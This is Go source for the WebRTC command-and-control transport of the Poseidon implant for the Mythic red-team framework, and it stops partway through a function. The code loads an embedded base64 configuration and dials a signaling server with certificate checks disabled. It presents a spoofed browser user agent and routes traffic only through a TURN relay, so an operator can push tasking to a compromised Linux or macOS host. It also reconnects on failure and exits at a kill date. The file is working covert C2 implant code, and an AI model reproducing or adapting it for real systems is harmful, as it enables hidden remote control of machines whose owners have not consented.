//go:build (linux || darwin) && webrtc

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"

	"github.com/gorilla/websocket"
	"github.com/pion/webrtc/v4"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

const (
	webRTCTaskingTypePush                = "Push"
	webRTCDefaultUserAgent               = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	webRTCDefaultDataChannelTimeout      = 30 * time.Second
	webRTCDefaultReconnectMaxRetries     = 5
	webRTCKillDateCheckInterval          = 60 * time.Second
	webRTCDefaultSDPAnswerTimeout        = 15 * time.Second
	webRTCDefaultICEConnectionTimeout    = 30 * time.Second
	webRTCDefaultReconnectInitialBackoff = 2 * time.Second
	webRTCDefaultReconnectMaxBackoff     = 30 * time.Second

	webRTCProxyPushChannelSize     = 4096
	webRTCDataChannelHighQueueSize = 512
	webRTCDataChannelBulkQueueSize = 4096
	webRTCBufferedAmountHigh       = 4 * 1024 * 1024
	webRTCBufferedAmountLow        = 1 * 1024 * 1024
	webRTCWriterEnqueueTimeout     = 5 * time.Second
	webRTCWriterPollInterval       = 100 * time.Millisecond
	webRTCMaxOutboundFrameSize     = 8 * 1024 * 1024
)

var webrtc_initial_config string

type WebRTCInitialConfig struct {
	SignalingServer        string
	AuthKey                string
	TurnServer             string
	TurnUsername           string
	TurnPassword           string
	EncryptedExchangeCheck bool
	AESPSK                 string
	Endpoint               string
	Killdate               string
	UserAgent              string
}

func (e *WebRTCInitialConfig) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["signaling_server"]; ok {
		e.SignalingServer = v.(string)
	}
	if v, ok := alias["auth_key"]; ok {
		e.AuthKey = v.(string)
	}
	if v, ok := alias["turn_server"]; ok {
		e.TurnServer = v.(string)
	}
	if v, ok := alias["turn_username"]; ok {
		e.TurnUsername = v.(string)
	}
	if v, ok := alias["turn_password"]; ok {
		e.TurnPassword = v.(string)
	}
	if v, ok := alias["encrypted_exchange_check"]; ok {
		e.EncryptedExchangeCheck = v.(bool)
	}
	if v, ok := alias["AESPSK"]; ok {
		e.AESPSK = v.(string)
	}
	if v, ok := alias["websocket_path"]; ok {
		e.Endpoint = v.(string)
	} else if v, ok := alias["ENDPOINT_REPLACE"]; ok {
		e.Endpoint = v.(string)
	}
	if v, ok := alias["killdate"]; ok {
		e.Killdate = v.(string)
	}
	if v, ok := alias["USER_AGENT"]; ok {
		e.UserAgent = v.(string)
	}
	return nil
}

type webRTCSignalMessage struct {
	Type             string  `json:"type"`
	Destination      string  `json:"destination"`
	SDP              string  `json:"sdp,omitempty"`
	Candidate        string  `json:"candidate,omitempty"`
	SDPMid           *string `json:"sdpMid,omitempty"`
	SDPMLineIndex    *uint16 `json:"sdpMLineIndex,omitempty"`
	UsernameFragment *string `json:"usernameFragment,omitempty"`
	AuthKey          string  `json:"authKey"`
	AgentUUID        string  `json:"agentUUID,omitempty"`
	Data             string  `json:"data,omitempty"`
}

type webRTCDataChannelWriter struct {
	dataChannel *webrtc.DataChannel
	highQueue   chan []byte
	bulkQueue   chan []byte
	done        chan struct{}
	lowBuffer   chan struct{}
	stopOnce    sync.Once
	onError     func(error)
}

func newWebRTCDataChannelWriter(dataChannel *webrtc.DataChannel, onError func(error)) *webRTCDataChannelWriter {
	writer := &webRTCDataChannelWriter{
		dataChannel: dataChannel,
		highQueue:   make(chan []byte, webRTCDataChannelHighQueueSize),
		bulkQueue:   make(chan []byte, webRTCDataChannelBulkQueueSize),
		done:        make(chan struct{}),
		lowBuffer:   make(chan struct{}, 1),
		onError:     onError,
	}
	dataChannel.SetBufferedAmountLowThreshold(webRTCBufferedAmountLow)
	dataChannel.OnBufferedAmountLow(func() {
		select {
		case writer.lowBuffer <- struct{}{}:
		default:
		}
	})
	go writer.run()
	return writer
}

func (w *webRTCDataChannelWriter) Stop() {
	w.stopOnce.Do(func() {
		close(w.done)
	})
}

func (w *webRTCDataChannelWriter) Enqueue(data []byte, bulk bool) error {
	if len(data) > webRTCMaxOutboundFrameSize {
		return fmt.Errorf("data channel frame too large: %d > %d", len(data), webRTCMaxOutboundFrameSize)
	}
	queue := w.highQueue
	if bulk {
		queue = w.bulkQueue
	}

	select {
	case queue <- data:
		return nil
	case <-w.done:
		return fmt.Errorf("data channel writer closed")
	case <-time.After(webRTCWriterEnqueueTimeout):
		return fmt.Errorf("data channel writer queue full")
	}
}

func (w *webRTCDataChannelWriter) run() {
	defer w.Stop()
	for {
		select {
		case data := <-w.highQueue:
			if !w.writeOrStop(data) {
				return
			}
		default:
			select {
			case data := <-w.highQueue:
				if !w.writeOrStop(data) {
					return
				}
			case data := <-w.bulkQueue:
				if !w.writeOrStop(data) {
					return
				}
			case <-w.done:
				return
			}
		}
	}
}

func (w *webRTCDataChannelWriter) writeOrStop(data []byte) bool {
	if err := w.write(data); err != nil {
		if !w.isStopped() && w.onError != nil {
			w.onError(err)
		}
		return false
	}
	return true
}

func (w *webRTCDataChannelWriter) isStopped() bool {
	select {
	case <-w.done:
		return true
	default:
		return false
	}
}

func (w *webRTCDataChannelWriter) write(data []byte) error {
	for w.dataChannel.BufferedAmount() > webRTCBufferedAmountHigh {
		select {
		case <-w.lowBuffer:
		case <-time.After(webRTCWriterPollInterval):
		case <-w.done:
			return fmt.Errorf("data channel writer stopped")
		}
	}

	if w.dataChannel.ReadyState() != webrtc.DataChannelStateOpen {
		return fmt.Errorf("data channel not open: %s", w.dataChannel.ReadyState().String())
	}

	return w.dataChannel.Send(data)
}

type C2WebRTC struct {
	SignalingServer string
	AuthKey         string
	TurnServer      string
	TurnUsername    string
	TurnPassword    string
	UserAgent       string
	Endpoint        string
	TaskingType     string

	Key            string
	rsaPrivateKey  *rsa.PrivateKey
	ExchangingKeys bool

	signalingConn  *websocket.Conn
	DataChannel    *webrtc.DataChannel
	dataWriter     *webRTCDataChannelWriter
	peerConnection *webrtc.PeerConnection

	finishedStaging bool
	ShouldStop      bool
	killdate        time.Time

	stoppedChannel chan bool
	PushChannel    chan structs.MythicMessage

	Lock          sync.RWMutex
	reconnectLock sync.Mutex
	signalingLock sync.Mutex
	stateLock     sync.RWMutex

	reconnecting             bool
	dataChannelOpen          chan struct{}
	iceConnected             chan struct{}
	peerConnected            chan struct{}
	lastICEState             webrtc.ICEConnectionState
	lastPeerConnectionState  webrtc.PeerConnectionState
	localCandidatesSent      int
	remoteCandidatesReceived int
}

func (e C2WebRTC) MarshalJSON() ([]byte, error) {
	alias := map[string]interface{}{
		"SignalingServer": e.SignalingServer,
		"AuthKey":         e.AuthKey,
		"TurnServer":      e.TurnServer,
		"TurnUsername":    e.TurnUsername,
		"TurnPassword":    e.TurnPassword,
		"UserAgent":       e.UserAgent,
		"EncryptionKey":   e.Key,
		"WebRTC Endpoint": e.Endpoint,
		"TaskingType":     e.TaskingType,
		"KillDate":        e.killdate,
	}
	return json.Marshal(alias)
}

var webrtcDialer = websocket.Dialer{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}

func init() {
	config, err := loadWebRTCInitialConfig()
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to load WebRTC config: %v", err))
		os.Exit(1)
	}

	profile, err := NewC2WebRTC(config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create WebRTC profile: %v", err))
		os.Exit(1)
	}

	RegisterAvailableC2Profile(profile)
	go profile.CreateMessagesForEgressConnections()
}

func loadWebRTCInitialConfig() (WebRTCInitialConfig, error) {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(webrtc_initial_config)
	if err != nil {
		return WebRTCInitialConfig{}, fmt.Errorf("error decoding initial config: %w", err)
	}

	var config WebRTCInitialConfig
	if err := json.Unmarshal(initialConfigBytes, &config); err != nil {
		return WebRTCInitialConfig{}, fmt.Errorf("error unmarshaling initial config: %w", err)
	}

	return config, nil
}

func NewC2WebRTC(config WebRTCInitialConfig) (*C2WebRTC, error) {
	killDateTime, err := parseWebRTCKillDate(config.Killdate)
	if err != nil {
		return nil, fmt.Errorf("invalid kill date: %w", err)
	}

	userAgent := config.UserAgent
	if userAgent == "" {
		userAgent = webRTCDefaultUserAgent
	}

	profile := &C2WebRTC{
		SignalingServer: config.SignalingServer,
		AuthKey:         config.AuthKey,
		TurnServer:      config.TurnServer,
		TurnUsername:    config.TurnUsername,
		TurnPassword:    config.TurnPassword,
		UserAgent:       userAgent,
		TaskingType:     webRTCTaskingTypePush,
		Key:             config.AESPSK,
		Endpoint:        config.Endpoint,
		ExchangingKeys:  config.EncryptedExchangeCheck,
		killdate:        killDateTime,
		ShouldStop:      true,
		stoppedChannel:  make(chan bool, 1),
		PushChannel:     make(chan structs.MythicMessage, webRTCProxyPushChannelSize),
	}
	profile.resetConnectionState()
	return profile, nil
}

func parseWebRTCKillDate(killdate string) (time.Time, error) {
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
	return time.Parse("2006-01-02T15:04:05.000Z", killDateString)
}

func newWebRTCStateChannel() chan struct{} {
	return make(chan struct{}, 1)
}

func signalWebRTCState(ch chan struct{}) {
	select {
	case ch <- struct{}{}:
	default:
	}
}

func (c *C2WebRTC) resetConnectionState() {
	c.stateLock.Lock()
	defer c.stateLock.Unlock()

	c.dataChannelOpen = newWebRTCStateChannel()
	c.iceConnected = newWebRTCStateChannel()
	c.peerConnected = newWebRTCStateChannel()
	c.lastICEState = webrtc.ICEConnectionStateNew
	c.lastPeerConnectionState = webrtc.PeerConnectionStateNew
	c.localCandidatesSent = 0
	c.remoteCandidatesReceived = 0
}

func (c *C2WebRTC) connectionEventChannels() (chan struct{}, chan struct{}, chan struct{}) {
	c.stateLock.RLock()
	defer c.stateLock.RUnlock()
	return c.dataChannelOpen, c.iceConnected, c.peerConnected
}

func (c *C2WebRTC) recordDataChannelOpen() {
	c.stateLock.RLock()
	dataChannelOpen := c.dataChannelOpen
	c.stateLock.RUnlock()
	signalWebRTCState(dataChannelOpen)
}

func (c *C2WebRTC) recordICEConnectionState(state webrtc.ICEConnectionState) {
	c.stateLock.Lock()
	c.lastICEState = state
	iceConnected := c.iceConnected
	c.stateLock.Unlock()

	if state == webrtc.ICEConnectionStateConnected || state == webrtc.ICEConnectionStateCompleted {
		signalWebRTCState(iceConnected)
	}
}

func (c *C2WebRTC) recordPeerConnectionState(state webrtc.PeerConnectionState) {
	c.stateLock.Lock()
	c.lastPeerConnectionState = state
	peerConnected := c.peerConnected
	c.stateLock.Unlock()

	if state == webrtc.PeerConnectionStateConnected {
		signalWebRTCState(peerConnected)
	}
}

func (c *C2WebRTC) recordLocalCandidateSent() {
	c.stateLock.Lock()
	c.localCandidatesSent++
	c.stateLock.Unlock()
}

func (c *C2WebRTC) recordRemoteCandidateReceived() {
	c.stateLock.Lock()
	c.remoteCandidatesReceived++
	c.stateLock.Unlock()
}

func (c *C2WebRTC) connectionStateSummary() string {
	c.stateLock.RLock()
	defer c.stateLock.RUnlock()

	return fmt.Sprintf(
		"local_candidates_sent=%d remote_candidates_received=%d last_ice_state=%s last_peer_connection_state=%s",
		c.localCandidatesSent,
		c.remoteCandidatesReceived,
		c.lastICEState.String(),
		c.lastPeerConnectionState.String(),
	)
}

func (c *C2WebRTC) Sleep() {}

func (c *C2WebRTC) IsP2P() bool {
	return false
}

func (c *C2WebRTC) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2WebRTC) ProfileName() string {
	return "webrtc"
}

func (c *C2WebRTC) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2WebRTC) GetPushChannel() chan structs.MythicMessage {
	if !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}

func (c *C2WebRTC) GetKillDate() time.Time {
	return c.killdate
}

func (c *C2WebRTC) GetSleepTime() int {
	return 0
}

func (c *C2WebRTC) GetSleepInterval() int {
	return 0
}

func (c *C2WebRTC) GetSleepJitter() int {
	return 0
}

func (c *C2WebRTC) SetSleepInterval(interval int) string {
	return "Sleep interval not used for Push style C2 Profile\n"
}

func (c *C2WebRTC) SetSleepJitter(jitter int) string {
	return "Jitter interval not used for Push style C2 Profile\n"
}

func (c *C2WebRTC) Start() {
	if !c.ShouldStop {
		return
	}

	c.ShouldStop = false
	go c.checkForKillDate()

	defer func() {
		c.closeConnections()
		c.stoppedChannel <- true
	}()

	if err := c.establishConnection(); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to establish connection: %v", err))
		return
	}

	if err := c.waitForDataChannelReady(); err != nil {
		utils.PrintDebug(fmt.Sprintf("Data channel setup failed: %v", err))
		return
	}

	c.closeSignalingConnection()
	c.startDataChannelListener()
}

func (c *C2WebRTC) Stop() {
	if c.ShouldStop {
		return
	}

	c.ShouldStop = true
	c.closeConnections()

	utils.PrintDebug("Issued stop to WebRTC")
	<-c.stoppedChannel
	utils.PrintDebug("WebRTC fully stopped")
}

func (c *C2WebRTC) closeConnections() {
	c.closeSignalingConnection()

	c.Lock.Lock()
	if c.dataWriter != nil {
		c.dataWriter.Stop()
		c.dataWriter = nil
	}
	c.DataChannel = nil
	c.Lock.Unlock()

	if c.peerConnection != nil {
		c.peerConnection.Close()
		c.peerConnection = nil
	}
}

func (c *C2WebRTC) checkForKillDate() {
	ticker := time.NewTicker(webRTCKillDateCheckInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.ShouldStop {
				return
			}
			if time.Now().After(c.killdate) {
				os.Exit(1)
			}
		}
	}
}

func (c *C2WebRTC) establishConnection() error {
	if err := c.connectSignaling(); err != nil {
		return fmt.Errorf("signaling connection failed: %w", err)
	}

	if err := c.setupWebRTC(); err != nil {
		return fmt.Errorf("WebRTC setup failed: %w", err)
	}

	if err := c.exchangeSDP(); err != nil {
		return fmt.Errorf("SDP exchange failed: %w", err)
	}

	return nil
}

func (c *C2WebRTC) connectSignaling() error {
	header := http.Header{
		"User-Agent":  []string{c.UserAgent},
		"Accept-Type": []string{"Push"},
	}

	conn, _, err := webrtcDialer.Dial(c.SignalingServer, header)
	if err != nil {
		return fmt.Errorf("failed to dial signaling server: %w", err)
	}

	c.signalingLock.Lock()
	c.signalingConn = conn
	c.signalingLock.Unlock()
	utils.PrintDebug("Connected to signaling server")
	return nil
}

func (c *C2WebRTC) setupWebRTC() error {
	c.resetConnectionState()

	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs:       []string{c.TurnServer},
				Username:   c.TurnUsername,
				Credential: c.TurnPassword,
			},
		},
		ICETransportPolicy: webrtc.ICETransportPolicyRelay,
	}

	pc, err := webrtc.NewPeerConnection(config)
	if err != nil {
		return fmt.Errorf("failed to create peer connection: %w", err)
	}

	c.peerConnection = pc
	utils.PrintDebug(fmt.Sprintf("Setting up WebRTC with TURN Server: %s", c.TurnServer))

	return c.setupDataChannel()
}

func (c *C2WebRTC) setupDataChannel() error {
	dataChannelConfig := &webrtc.DataChannelInit{
		Ordered:    boolPtr(true),
		Protocol:   stringPtr("json"),
		Negotiated: boolPtr(false),
	}

	dc, err := c.peerConnection.CreateDataChannel("data", dataChannelConfig)
	if err != nil {
		return fmt.Errorf("failed to create data channel: %w", err)
	}

	c.setupDataChannelHandlers(dc)
	c.setupConnectionStateHandlers()

	return nil
}

func (c *C2WebRTC) setupDataChannelHandlers(dc *webrtc.DataChannel) {
	dc.OnOpen(func() {
		utils.PrintDebug(fmt.Sprintf("Data channel opened, state: %s", dc.ReadyState().String()))
		writer := newWebRTCDataChannelWriter(dc, func(err error) {
			utils.PrintDebug(fmt.Sprintf("Data channel writer error: %v", err))
			if !c.ShouldStop {
				c.requestReconnect("Data channel writer failed, attempting reconnect")
			}
		})
		c.Lock.Lock()
		if c.dataWriter != nil {
			c.dataWriter.Stop()
		}
		c.DataChannel = dc
		c.dataWriter = writer
		c.Lock.Unlock()
		c.recordDataChannelOpen()
		utils.PrintDebug("WebRTC data channel is ready for communication")
	})

	dc.OnMessage(func(msg webrtc.DataChannelMessage) {
		utils.PrintDebug(fmt.Sprintf("Message of length: %d received on data channel", len(msg.Data)))
		c.processMessage(msg.Data)
	})

	dc.OnClose(func() {
		utils.PrintDebug("Data channel closed")
		c.Lock.Lock()
		if c.DataChannel == dc {
			c.DataChannel = nil
			if c.dataWriter != nil {
				c.dataWriter.Stop()
				c.dataWriter = nil
			}
		}
		c.Lock.Unlock()
		if !c.ShouldStop {
			c.requestReconnect("Data channel closed, attempting reconnect")
		}
	})

	dc.OnError(func(err error) {
		utils.PrintDebug(fmt.Sprintf("Data channel error: %v", err))
		c.Lock.Lock()
		if c.DataChannel == dc && c.dataWriter != nil {
			c.dataWriter.Stop()
			c.dataWriter = nil
		}
		c.Lock.Unlock()
		if !c.ShouldStop {
			c.requestReconnect("Data channel error, attempting reconnect")
		}
	})
}

func (c *C2WebRTC) setupConnectionStateHandlers() {
	c.peerConnection.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		c.recordPeerConnectionState(state)
		utils.PrintDebug(fmt.Sprintf("Peer connection state changed: %s", state))

		switch state {
		case webrtc.PeerConnectionStateConnected:
			utils.PrintDebug("Peer connection established")
		case webrtc.PeerConnectionStateDisconnected,
			webrtc.PeerConnectionStateFailed,
			webrtc.PeerConnectionStateClosed:
			c.requestReconnect(fmt.Sprintf("Peer connection state %s, attempting reconnect", state.String()))
		}
	})

	c.peerConnection.OnICEConnectionStateChange(func(state webrtc.ICEConnectionState) {
		c.recordICEConnectionState(state)
		utils.PrintDebug(fmt.Sprintf("ICE connection state changed: %s", state.String()))

		switch state {
		case webrtc.ICEConnectionStateConnected,
			webrtc.ICEConnectionStateCompleted:
			utils.PrintDebug("ICE connection established")
		case webrtc.ICEConnectionStateDisconnected,
			webrtc.ICEConnectionStateFailed,
			webrtc.ICEConnectionStateClosed:
			utils.PrintDebug("WebRTC connection lost, attempting to reconnect")
			c.requestReconnect("ICE connection lost, attempting reconnect")
		}
	})
}

func (c *C2WebRTC) waitForDataChannelReady() error {
	utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
	if c.isDataChannelReady() {
		utils.PrintDebug("Data channel is ready")
		return nil
	}

	dataChannelOpen, _, _ := c.connectionEventChannels()
	timeout := time.NewTimer(webRTCDefaultDataChannelTimeout)
	defer timeout.Stop()

	for {
		select {
		case <-timeout.C:
			return fmt.Errorf("timeout waiting for data channel to open after %s (%s)", webRTCDefaultDataChannelTimeout, c.connectionStateSummary())
		case <-dataChannelOpen:
			if c.isDataChannelReady() {
				utils.PrintDebug("Data channel is ready")
				return nil
			}
		}
	}
}

func (c *C2WebRTC) closeSignalingConnection() {
	c.signalingLock.Lock()
	defer c.signalingLock.Unlock()

	if c.signalingConn != nil {
		utils.PrintDebug("Closing signaling WebSocket connection")
		c.signalingConn.Close()
		c.signalingConn = nil
		utils.PrintDebug("WebSocket closed, data channel ready for push mode")
	}
}

func (c *C2WebRTC) writeSignalingMessage(message webRTCSignalMessage) error {
	c.signalingLock.Lock()
	defer c.signalingLock.Unlock()

	if c.signalingConn == nil {
		return fmt.Errorf("signaling connection is nil")
	}
	return c.signalingConn.WriteJSON(message)
}

func (c *C2WebRTC) exchangeSDP() error {
	utils.PrintDebug("Starting SDP exchange")

	localICECompleteChan := make(chan struct{}, 1)
	remoteICECompleteChan := make(chan struct{}, 1)
	offerSent := make(chan struct{})
	offerSentClosed := false
	closeOfferSent := func() {
		if !offerSentClosed {
			close(offerSent)
			offerSentClosed = true
		}
	}
	defer closeOfferSent()

	c.setupICECandidateHandler(localICECompleteChan, offerSent)

	if err := c.createAndSetOffer(); err != nil {
		return err
	}

	if err := c.sendOffer(); err != nil {
		return err
	}
	closeOfferSent()

	return c.handleSignalingAndWait(localICECompleteChan, remoteICECompleteChan)
}

func (c *C2WebRTC) createAndSetOffer() error {
	offer, err := c.peerConnection.CreateOffer(nil)
	if err != nil {
		return fmt.Errorf("failed to create offer: %w", err)
	}

	utils.PrintDebug(fmt.Sprintf("Created offer successfully, SDP type: %v", offer.Type))

	if err = c.peerConnection.SetLocalDescription(offer); err != nil {
		return fmt.Errorf("failed to set local description: %w", err)
	}

	return nil
}

func (c *C2WebRTC) setupICECandidateHandler(localICECompleteChan chan struct{}, offerSent <-chan struct{}) {
	c.peerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
		if candidate == nil {
			utils.PrintDebug("Local ICE candidate gathering complete")
			signalWebRTCCompletion(localICECompleteChan)
			go c.sendICECompleteMessage(offerSent)
			return
		}
		candidateJSON := candidate.ToJSON()
		go c.sendICECandidate(candidateJSON, offerSent)
	})
}

func signalWebRTCCompletion(ch chan struct{}) {
	select {
	case ch <- struct{}{}:
	default:
	}
}

func signalingAgentUUID() string {
	if mythicID := GetMythicID(); mythicID != "" {
		return mythicID
	}
	return UUID
}

func (c *C2WebRTC) waitForOfferSent(offerSent <-chan struct{}) bool {
	select {
	case <-offerSent:
		return true
	case <-time.After(webRTCDefaultSDPAnswerTimeout):
		utils.PrintDebug("Timed out waiting for offer before sending ICE signaling")
		return false
	}
}

func (c *C2WebRTC) sendICECompleteMessage(offerSent <-chan struct{}) {
	if !c.waitForOfferSent(offerSent) {
		return
	}

	signalMessage := webRTCSignalMessage{
		Type:        "ice_complete",
		Destination: "answer",
		AuthKey:     c.AuthKey,
		AgentUUID:   signalingAgentUUID(),
	}

	if err := c.writeSignalingMessage(signalMessage); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send ICE completion: %v", err))
	} else {
		utils.PrintDebug("Sent ICE completion to server")
	}
}

func (c *C2WebRTC) sendICECandidate(candidate webrtc.ICECandidateInit, offerSent <-chan struct{}) {
	if !c.waitForOfferSent(offerSent) {
		return
	}

	if candidate.Candidate == "" {
		utils.PrintDebug("WARNING: Empty candidate string generated")
		return
	}

	signalMessage := webRTCSignalMessage{
		Type:             "candidate",
		Destination:      "answer",
		Candidate:        candidate.Candidate,
		SDPMid:           candidate.SDPMid,
		SDPMLineIndex:    candidate.SDPMLineIndex,
		UsernameFragment: candidate.UsernameFragment,
		AuthKey:          c.AuthKey,
		AgentUUID:        signalingAgentUUID(),
	}

	utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidate.Candidate))

	if err := c.writeSignalingMessage(signalMessage); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send ICE candidate: %v", err))
	} else {
		c.recordLocalCandidateSent()
		utils.PrintDebug("Successfully sent ICE candidate")
	}
}

func (c *C2WebRTC) sendOffer() error {
	offer := c.peerConnection.LocalDescription()
	if offer == nil {
		return fmt.Errorf("failed to get local description")
	}

	offerMessage := webRTCSignalMessage{
		Type:        "offer",
		Destination: "answer",
		SDP:         offer.SDP,
		AuthKey:     c.AuthKey,
		AgentUUID:   signalingAgentUUID(),
	}

	utils.PrintDebug("Sending offer message to server")

	if err := c.writeSignalingMessage(offerMessage); err != nil {
		return fmt.Errorf("failed to send offer: %w", err)
	}

	utils.PrintDebug("Offer sent successfully, waiting for response...")
	return nil
}

func (c *C2WebRTC) handleSignalingAndWait(localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}) error {
	sdpChan := make(chan webrtc.SessionDescription, 1)
	candidateChan := make(chan webrtc.ICECandidateInit, 64)
	doneChan := make(chan bool, 1)

	go c.handleSignalingMessages(sdpChan, candidateChan, doneChan, remoteICECompleteChan)

	if err := c.waitForSDPAnswer(sdpChan); err != nil {
		return err
	}

	return c.waitForDataChannel(candidateChan, doneChan, localICECompleteChan, remoteICECompleteChan)
}

func (c *C2WebRTC) handleSignalingMessages(sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, remoteICECompleteChan chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			utils.PrintDebug(fmt.Sprintf("Recovered from panic in signaling handler: %v", r))
			doneChan <- false
		}
	}()

	for {
		if c.signalingConn == nil {
			utils.PrintDebug("SignalingConn is nil, exiting signaling handler")
			doneChan <- false
			return
		}

		var msg webRTCSignalMessage
		err := c.signalingConn.ReadJSON(&msg)
		if err != nil {
			if c.isExpectedConnectionError(err) {
				utils.PrintDebug("Signaling connection closed (expected)")
				return
			}
			utils.PrintDebug(fmt.Sprintf("Error reading from signaling server: %v", err))
			doneChan <- false
			return
		}

		if !c.processSignalingMessage(msg, sdpChan, candidateChan, doneChan, remoteICECompleteChan) {
			return
		}
	}
}

func (c *C2WebRTC) processSignalingMessage(msg webRTCSignalMessage, sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, remoteICECompleteChan chan struct{}) bool {
	switch msg.Type {
	case "answer":
		return c.handleAnswerMessage(msg, sdpChan)
	case "candidate":
		return c.handleCandidateMessage(msg, candidateChan)
	case "ice_complete":
		utils.PrintDebug("Received ICE completion from server")
		signalWebRTCCompletion(remoteICECompleteChan)
		return true
	case "connected":
		utils.PrintDebug("Received 'connected' message from signaling server")
		doneChan <- true
		return false
	case "error":
		utils.PrintDebug(fmt.Sprintf("Server reported error: %s", msg.Data))
		doneChan <- false
		return false
	}
	return true
}

func (c *C2WebRTC) handleAnswerMessage(msg webRTCSignalMessage, sdpChan chan webrtc.SessionDescription) bool {
	if msg.SDP == "" {
		utils.PrintDebug("Received answer without SDP")
		return false
	}

	sdp := webrtc.SessionDescription{
		Type: webrtc.SDPTypeAnswer,
		SDP:  msg.SDP,
	}

	sdpChan <- sdp
	return true
}

func (c *C2WebRTC) handleCandidateMessage(msg webRTCSignalMessage, candidateChan chan webrtc.ICECandidateInit) bool {
	if msg.Candidate == "" {
		utils.PrintDebug("Received empty ICE candidate from server, ignoring")
		return true
	}
	c.recordRemoteCandidateReceived()

	candidate := webrtc.ICECandidateInit{
		Candidate:        msg.Candidate,
		SDPMid:           msg.SDPMid,
		SDPMLineIndex:    msg.SDPMLineIndex,
		UsernameFragment: msg.UsernameFragment,
	}

	utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
	candidateChan <- candidate
	return true
}

func (c *C2WebRTC) waitForSDPAnswer(sdpChan chan webrtc.SessionDescription) error {
	select {
	case sdp := <-sdpChan:
		utils.PrintDebug("Received SDP answer, setting remote description")
		if err := c.peerConnection.SetRemoteDescription(sdp); err != nil {
			return fmt.Errorf("failed to set remote description: %w", err)
		}
		utils.PrintDebug("Set remote description successfully")
		return nil
	case <-time.After(webRTCDefaultSDPAnswerTimeout):
		return fmt.Errorf("timeout waiting for SDP answer after %s (%s)", webRTCDefaultSDPAnswerTimeout, c.connectionStateSummary())
	}
}

func (c *C2WebRTC) waitForDataChannel(candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}) error {
	candidatesProcessed := 0
	localICEComplete := false
	remoteICEComplete := false
	dataChannelOpen, iceConnected, peerConnected := c.connectionEventChannels()
	timeout := time.NewTimer(webRTCDefaultICEConnectionTimeout)
	defer timeout.Stop()

	utils.PrintDebug("Processing ICE candidates and waiting for data channel...")

	for {
		select {
		case candidate := <-candidateChan:
			candidatesProcessed += c.processICECandidate(candidate)
		case <-localICECompleteChan:
			localICEComplete = true
		case <-remoteICECompleteChan:
			remoteICEComplete = true
		case <-iceConnected:
			utils.PrintDebug("Observed ICE connected state while waiting for data channel")
			if c.isDataChannelReady() {
				c.sendConnectedMessage()
				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
				return nil
			}
		case <-peerConnected:
			utils.PrintDebug("Observed peer connected state while waiting for data channel")
			if c.isDataChannelReady() {
				c.sendConnectedMessage()
				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
				return nil
			}
		case <-dataChannelOpen:
			if c.isDataChannelReady() {
				c.sendConnectedMessage()
				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
				return nil
			}
		case success := <-doneChan:
			if success {
				return nil
			}
			return fmt.Errorf("signaling failed")
		case <-timeout.C:
			return c.handleConnectionTimeout(candidatesProcessed, localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
		}
	}
}

func (c *C2WebRTC) processICECandidate(candidate webrtc.ICECandidateInit) int {
	utils.PrintDebug(fmt.Sprintf("Processing ICE candidate: %s", candidate.Candidate))

	if c.peerConnection != nil {
		if err := c.peerConnection.AddICECandidate(candidate); err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to add ICE candidate: %v", err))
			return 0
		}
		utils.PrintDebug("Added ICE candidate successfully")
		return 1
	}
	return 0
}

func (c *C2WebRTC) sendConnectedMessage() {
	utils.PrintDebug("Data channel is ready! Sending 'connected' message")

	connectedMsg := webRTCSignalMessage{
		Type:        "connected",
		Destination: "answer",
		AuthKey:     c.AuthKey,
		AgentUUID:   signalingAgentUUID(),
	}

	if err := c.writeSignalingMessage(connectedMsg); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send connected message: %v", err))
	} else {
		utils.PrintDebug("Sent 'connected' message to server")
	}
}

func (c *C2WebRTC) waitForICECompletion(localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}, localICEComplete bool, remoteICEComplete bool) {
